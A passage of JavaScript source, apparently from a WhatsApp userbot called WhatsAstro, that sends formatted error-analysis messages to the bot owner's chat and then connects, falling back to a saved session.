                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*⚕️ ERROR ANALYSIS [WhatsAstro] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await WhatsAstroCN.sendMessage(WhatsAstroCN.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await WhatsAstroCN.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Loading Old Version Session...'))
            WhatsAstroCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await WhatsAstroCN.connect();
            } catch {
                return;
            }
        }
    }
}

WhatsAstro();
